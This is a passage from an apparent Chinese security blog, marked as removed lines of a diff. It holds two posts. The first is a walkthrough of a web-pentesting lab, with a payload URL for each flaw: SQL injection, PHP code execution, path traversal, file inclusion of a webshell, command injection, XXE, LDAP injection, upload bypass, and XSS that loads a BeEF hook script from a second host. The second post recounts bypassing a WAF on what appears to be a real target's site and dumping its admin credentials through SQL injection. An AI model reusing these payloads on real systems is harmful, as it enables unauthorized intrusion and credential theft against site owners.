-<p>(9)同上,利用时间盲注依然是可行的<br><img src="/img/sqli9.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/sqli</span><span class="regexp">/example9.php?order=name,(if((ascii(mid((select version()),1,1))=53),sleep(5),1))%23</span></div></pre></td></tr></table></figure></p>
-<p><img src="/img/sqli9_s.png" alt="&#39;&#39;"><br><br></p>
-<h2 id="php代码执行"><a href="#php代码执行" class="headerlink" title="php代码执行:"></a>php代码执行:</h2><p>(1)把没有任何过滤的内容就直接给eval,将前后的双引号闭合即可<br><img src="/img/code1.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/codeexec</span><span class="regexp">/example1.php?name=";system('ls -la');phpinfo();/</span><span class="regexp">/</span></div></pre></td></tr></table></figure></p>
-<p><img src="/img/code1_s.png" alt="&#39;&#39;"><br></p>
-<p>(2)同样,对传入的值没有任何过滤,crate_function()相必大家都已经非常熟悉了,专门用来组装函数,在以前的各类php代码执行漏洞中经常能看到它的影子,它会出现代码执行的根本原因还是它内部还会有个eval的动作<br><img src="/img/code2.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/codeexec</span><span class="regexp">/example2.php?order=id,$b-&gt;name);&#125;system('ls -al');/</span><span class="regexp">/</span></div></pre></td></tr></table></figure></p>
-<p><img src="/img/code2_s.png" alt="&#39;&#39;"><br></p>
-<p>(3)preg_replace()本来是个挺正常的正则替换函数,但加了/e修正符后,瞬间就污了很多,要替换的内容的那一部分会被当做php代码来执行<br><img src="/img/code3.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/codeexec</span><span class="regexp">/example3.php?new=system('ls -l')&amp;pattern=/lamer</span><span class="regexp">/e&amp;base=Hello lamer</span></div></pre></td></tr></table></figure></p>
-<p><img src="/img/code3_s.png" alt="&#39;&#39;"><br></p>
-<p>(4)闭合前面的单引号,再拼接自己的php代码即可,典型的代码执行函数assert(),不多说,大家应该非常熟悉了,各类php一句话中经常也能看到<br><img src="/img/code4.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/codeexec</span><span class="regexp">/example4.php?name=hacker'.system('ls -la');/</span><span class="regexp">/</span></div></pre></td></tr></table></figure></p>
-<p><img src="/img/code4_s.png" alt="&#39;&#39;"><br><br><br></p>
-<h2 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取:"></a>任意文件读取:</h2><p>(1)对传入的文件路径没有进行任何过滤,直接跟上要读的文件即可<br><img src="/img/dir.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/dirtrav</span><span class="regexp">/example1.php?file=../</span>../../../etc/passwd</div></pre></td></tr></table></figure></p>
-<p><img src="/img/dir_s.png" alt="&#39;&#39;"><br></p>
-<p>(2)把’/var/www/files/‘这个路径截掉,然后只取后面的文件名,绕过自然也很简单,在这个路径的基础上继续跟上正常的文件路径即可<br><img src="/img/dir1.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/dirtrav</span><span class="regexp">/example2.php?file=/var</span><span class="regexp">/www/files</span><span class="regexp">/../</span>../../../etc/passwd</div></pre></td></tr></table></figure></p>
-<p><img src="/img/dir1_s.png" alt="&#39;&#39;"><br></p>
-<p>(3)拼接了个.png的后缀,%00截断后缀php高版本早已修复该漏洞<br><img src="/img/dir2.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/dirtrav</span><span class="regexp">/example3.php?file=../</span>../../../etc/passwd%<span class="number">00</span></div></pre></td></tr></table></figure></p>
-<p><img src="/img/dir2_s.png" alt="&#39;&#39;"><br><br></p>
-<h2 id="php文件包含"><a href="#php文件包含" class="headerlink" title="php文件包含:"></a>php文件包含:</h2><p>(1)没有任何过滤的包含,直接包含本地的webshell即可,如下,被包含的大马正常执行<br><img src="/img/fileinc.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/fileincl</span><span class="regexp">/example1.php?page=../upload</span><span class="regexp">/images/</span><span class="number">404</span>.php</div></pre></td></tr></table></figure></p>
-<p><img src="/img/fileinc_s.png" alt="&#39;&#39;"><br></p>
-<p>(2)在后面拼接了个.php的后缀,同样,利用%00截断<br><img src="/img/fileinc1.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/fileincl</span><span class="regexp">/example2.php?page=../upload</span><span class="regexp">/images/</span><span class="number">404</span>.php%<span class="number">00</span></div></pre></td></tr></table></figure></p>
-<p><img src="/img/fileinc1_s.png" alt="&#39;&#39;"><br><br></p>
-<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行:"></a>命令执行:</h2><p>(1)没有任何过滤的传入,在linux中可用分号分割连续执行多个命令,win中可用&amp;&amp;<br><img src="/img/cmd1.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/commandexec</span><span class="regexp">/example1.php?ip=127.0.0.1;ls -la</span></div></pre></td></tr></table></figure></p>
-<p><img src="/img/cmd1_s.png" alt="&#39;&#39;"><br></p>
-<p>(2)一眼看去,这个ip正则确实没法突破,但后面却紧跟了个/m修饰符,不得不又让我想起了%0a换行<br><img src="/img/cmd2.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/commandexec</span><span class="regexp">/example2.php?ip=127.0.0.1%0als -la</span></div></pre></td></tr></table></figure></p>
-<p><img src="/img/cmd2_s.png" alt="&#39;&#39;"><br></p>
-<p>(3)header()后面竟然没有结束脚本,大忌,header()只是跳转到指定页面,但如果你不手工结束当前脚本,即使跳到别的页面,当前脚本也依然会执行完再退出<br><img src="/img/cmd3.png" alt="&#39;&#39;"><br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://192.168.3.51/commandexec/example1.php?ip=127.0.0.1;ls -la</div><div class="line">C:\&gt;curl "192.168.3.51/commandexec/example3.php?ip=127.0.0.1;ls"   注意这里不能用浏览器了,因为它会跳过去,不过,你可以用curl来看结果</div></pre></td></tr></table></figure></p>
-<p><img src="/img/cmd3_s.png" alt="&#39;&#39;"><br><br></p>
-<h2 id="XXE注入"><a href="#XXE注入" class="headerlink" title="XXE注入:"></a>XXE注入:</h2><p>(1) 对外部的xml数据没有任何过滤,此时创建一个外部实体,而实体的作用是读取/etc/passwd文件,然后引用该实体,注意要url编码下<br><img src="/img/xxe.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/xml</span><span class="regexp">/example1.php?xml=&lt;!DOCTYPE result [&lt;!ENTITY res SYSTEM "file:/</span><span class="regexp">//etc</span><span class="regexp">/passwd" &gt;]&gt;&lt;text&gt;&amp;res;&lt;/text</span>&gt;</div><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/xml</span><span class="regexp">/example1.php?xml=%3C%21DOCTYPE%20result%20%5B%3C%21ENTITY%20res%20SYSTEM%20%22file%3A%2f%2f%2fetc%2fpasswd%22%20%3E%5D%3E%3Ctext%3E%26res%3B%3C%2ftext%3E</span></div></pre></td></tr></table></figure></p>
-<p><img src="/img/xxe_s.png" alt="&#39;&#39;"><br></p>
-<p>(2)没有任何过滤的拼接<br><img src="/img/xxe1.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/xml</span><span class="regexp">/example2.php?name=hacker'] | /</span><span class="regexp">/*| /</span><span class="regexp">/*['</span></div></pre></td></tr></table></figure></p>
-<p><img src="/img/xxe1_s.png" alt="&#39;&#39;"><br><br><br><br></p>
-<h2 id="ladp注入"><a href="#ladp注入" class="headerlink" title="ladp注入:"></a>ladp注入:</h2><p>(1)ldap允许匿名登录<br><img src="/img/ldap.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/ldap</span><span class="regexp">/example1.php</span></div></pre></td></tr></table></figure></p>
-<p><img src="/img/ldap_s.png" alt="&#39;&#39;"><br></p>
-<p>(2)闭合原有的过滤器,把后面的password截断即可<br><img src="/img/ldap2.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/ldap</span><span class="regexp">/example2.php?name=hacker)(cn=*))%00&amp;password=hacker</span></div></pre></td></tr></table></figure></p>
-<p><br><br></p>
-<h2 id="xss"><a href="#xss" class="headerlink" title="xss:"></a>xss:</h2><p>(1)没有任何过滤的情况<br><img src="/img/xss1.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/xss</span><span class="regexp">/example1.php?name=&lt;script&gt;alert('hello')&lt;/script</span>&gt;</div></pre></td></tr></table></figure></p>
-<p><img src="/img/xss1_s.png" alt="&#39;&#39;"><br></p>
-<p>(2)只过滤了’<script>‘和’</script>‘，大小写转换<br><img src="/img/xss2.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/xss</span><span class="regexp">/example2.php?name=&lt;Script&gt;alert('hello')&lt;/s</span>Cript&gt;</div></pre></td></tr></table></figure></p>
-<p><img src="/img/xss2_s.png" alt="&#39;&#39;"><br></p>
-<p>(3)这次依然是过滤’<script></script>‘,且不区分大小写,在&gt;前面加个空格即可绕过<br><img src="/img/xss3.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/xss</span><span class="regexp">/example3.php?name=&lt;ScripT &gt;alert('hello')&lt;/</span>Script &gt;</div></pre></td></tr></table></figure></p>
-<p><img src="/img/xss3_s.png" alt="&#39;&#39;"><br></p>
-<p>(4)不分区大小写过滤了’script’字符,没关系,把它转成对应的ASCII就好了<br><img src="/img/xss4.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/xss</span><span class="regexp">/example4.php?name=&lt;svg/onload</span>=<span class="string">"var i=String.fromCharCode(115, 99, 114, 105, 112, 116);s = createElement(i);body.appendChild(s);s.src='http://192.168.3.28:3000/hook.js';"</span></div></pre></td></tr></table></figure></p>
-<p><img src="/img/xss4_s.png" alt="&#39;&#39;"><br></p>
-<p>(5)过滤了alert,可惜我们都没用alert<br><img src="/img/xss5.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/xss</span><span class="regexp">/example5.php?name=hacker&lt;script src="http:/</span><span class="regexp">/192.168.3.28:3000/hook</span>.js<span class="string">"&gt;&lt;/script&gt;</span></div></pre></td></tr></table></figure></p>
-<p><img src="/img/xss5_s.png" alt="&#39;&#39;"><br></p>
-<p>(6)闭合前面的双引号,继续写js代码就好了<br><img src="/img/xss6.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/xss</span><span class="regexp">/example6.php?name=script";s=document.createElement($a);s.src="http:/</span><span class="regexp">/192.168.3.28:3000/hook</span>.js<span class="string">";document.getElementsByTagName( "</span>head<span class="string">" )[0].appendChild(s);//</span></div></pre></td></tr></table></figure></p>
-<p><img src="/img/xss6_s.png" alt="&#39;&#39;"><br></p>
-<p>(7)对特特殊字符进行实体化,但这似乎并没能改变什么<br><img src="/img/xss7.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/xss</span><span class="regexp">/example7.php?name=script';s=document.createElement($a);s.src='http:/</span><span class="regexp">/192.168.3.28:3000/hook</span>.js<span class="string">';document.getElementsByTagName( '</span>head<span class="string">')[0].appendChild(s);//</span></div></pre></td></tr></table></figure></p>
-<p><img src="/img/xss7_s.png" alt="&#39;&#39;"><br></p>
-<p>(8)闭合action的另一半双引号,后面再跟上script标记即可绕过<br><img src="/img/xss8.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/xss</span><span class="regexp">/example8.php/</span><span class="string">"&gt;&lt;script&gt;alert('hello')&lt;/script&gt;</span></div></pre></td></tr></table></figure></p>
-<p><img src="/img/xss8_s.png" alt="&#39;&#39;"><br></p>
-<p>(9)location.hash.substr获取的内容没有任何过滤<br><img src="/img/xss9.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/xss</span><span class="regexp">/example9.php#&lt;script src=http:/</span><span class="regexp">/192.168.3.28:3000/hook</span>.js&gt;&lt;<span class="regexp">/script&gt;</span></div></pre></td></tr></table></figure></p>
-<p><img src="/img/xss9_s.png" alt="&#39;&#39;"><br><br></p>
-<h2 id="php文件上传"><a href="#php文件上传" class="headerlink" title="php文件上传:"></a>php文件上传:</h2><p>(1)没有任何过滤,直接传php,大马正常执行<br><img src="/img/upload1.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/upload</span><span class="regexp">/example1.php</span></div></pre></td></tr></table></figure></p>
-<p><img src="/img/upload1_s.png" alt="&#39;&#39;"><br><br><img src="/img/upload1_s_1.png" alt="&#39;&#39;"><br></p>
-<p>(2)黑名单绕过,只要.php后缀,.php3即可绕过<br><img src="/img/upload2.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/upload</span><span class="regexp">/example2.php</span></div></pre></td></tr></table></figure></p>
-<p><img src="/img/upload2_s.png" alt="&#39;&#39;"><br><br><img src="/img/upload2_s_1.png" alt="&#39;&#39;"><br><br><br><br></p>
-<p>小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;闲的没事儿,拿来跑跑,没啥技术含量,顺带记录下,只为留给有需要的人</p>
-
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2016/05/20/bypass-waf-note/">
-                bypass waf入门之sql注入 [ 内联注释篇 ]
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2016-05-20</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/bypasswaf/">bypasswaf</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p>0x01 前言<br>&nbsp;&nbsp;&nbsp;&nbsp;昨天在搞一个目标的旁站时凑巧又碰到了waf,当然啦,这个waf比较弱,基本是弱到没朋友的那种,但为了博客的完整性,这里还是顺便就记录一下,留给有需要的朋友,方法非常简单,关于bypass waf的东西其实特别多,这里暂时只提一种,”内联注释”,招数早已经烂大街了,后续再遇到其它的bypass实例,也会继续更新到博客上,废话少说,看实例吧:</p>
-<p>0x02 依旧是先判断注入点是否存在,很显然,’and’没有拦<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://www.target.com/news/show1.php?id=1102 And 1212=1212  返回正常</div><div class="line">http://www.target.com/news/show1.php?id=1102 And 1212=121   返回异常,注入存在</div></pre></td></tr></table></figure></p>
-<p><img src="/img/waf test.png" alt="&#39;&#39;"><br><img src="/img/waf test 1.png" alt="&#39;&#39;"></p>
-<p>0x03 我们观察到,当字段个数为11的时候页面返回正常,说明当前表字段个数为11个,’order by’ 也没有拦,到这里为止,凭着一点经验自己心里就有种感觉,这个waf肯定非常好过,接着往下看吧<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.target.com/news</span><span class="regexp">/show1.php?id=1102 OrDer by 11</span></div></pre></td></tr></table></figure></p>
-<p><img src="/img/waf test order by .png" alt="&#39;&#39;"></p>
-<p>0x04 开始搜集信息,这时我们发现waf似乎开始起作用了,拦了我们的内置函数<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.target.com/news</span><span class="regexp">/show1.php?id=1102 And 1=12 +UNION+ALL+SELECT+1,2,user(),version(),database(),6,7,8,9,10,11 --+-</span></div></pre></td></tr></table></figure></p>
-<p><img src="/img/waf test lanjie.png" alt="&#39;&#39;"></p>
-<p>0x05 既然拦了函数,咱们就把函数给注释一下看看,然后就这么容易的通过了[以为还要折腾很久],好吧,既然它对这种内联注释感冒,那后面我就把所有的关键字都用这种方式包起来,省的我一个个猜它到底拦哪个<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.target.com/news</span><span class="regexp">/show1.php?id=1102 And 1=12 +UNION+ALL+SELECT+1,2,/</span>*!user()*<span class="regexp">/,version(),database(),6,7,8,9,10,11 --+-</span></div></pre></td></tr></table></figure></p>
-<p><img src="/img/waf version bypass.png" alt="&#39;&#39;"></p>
-<p>0x06 查询当前库中的所有表,这类我们看到了’t_admin’这张管理表<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.target.com/news</span><span class="regexp">/show1.php?id=1102 aNd 1=12 +/</span>*!UNION+ALL+SELECT*<span class="regexp">/+1,2,/</span>*!group_concat(table_name)*<span class="regexp">/,/</span>*!version()*<span class="regexp">/,/</span>*!database()*<span class="regexp">/,6,7,8,9,10,11 from /</span>*!information_schema.tables*<span class="regexp">/ /</span>*!where*<span class="regexp">/ /</span>*!table_schema*<span class="regexp">/=0x686e797075686b315f7363686f6f6c --+-</span></div></pre></td></tr></table></figure></p>
-<p><img src="/img/waf version bypass admin.png" alt="&#39;&#39;"></p>
-<p>0x07 查询’t_admin’表中的所有字段名,如下<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.target.com/news</span><span class="regexp">/show1.php?id=1102 ANd 1=12 +/</span>*!UNION+ALL+SELECT*<span class="regexp">/+1,2,/</span>*!group_concat(column_name)*<span class="regexp">/,/</span>*!version()*<span class="regexp">/,/</span>*!database()*<span class="regexp">/,6,7,8,9,10,11 from /</span>*!information_schema.columns*<span class="regexp">/ /</span>*!where*<span class="regexp">/ /</span>*!table_name*<span class="regexp">/=0x745f61646d696e --+-</span></div></pre></td></tr></table></figure></p>
-<p><img src="/img/waf version bypass columns.png" alt="&#39;&#39;"></p>
-<p>0x08 就剩最后一步了,查出管理员的账号密码即可<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.target.com/news</span><span class="regexp">/show1.php?id=1102 anD 1=12 +/</span>*!UNION+ALL+SELECT*<span class="regexp">/+1,2,/</span>*!admin_name*<span class="regexp">/,/</span>*!admin_password*<span class="regexp">/,5,6,7,8,9,10,11 from /</span>*!t_admin*<span class="regexp">/ /</span>*!limit*<span class="regexp">/ 0,1--+-</span></div></pre></td></tr></table></figure></p>
-<p><img src="/img/waf version bypass data.png" alt="&#39;&#39;"><br></p>
-<p>小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;没啥实际的技术含量,只是为了博客完整性稍作记录而已,关于bypass waf后续还会有很多的篇幅来说明,待续…<br></p>
-
-        </div>
     
 
 </div>
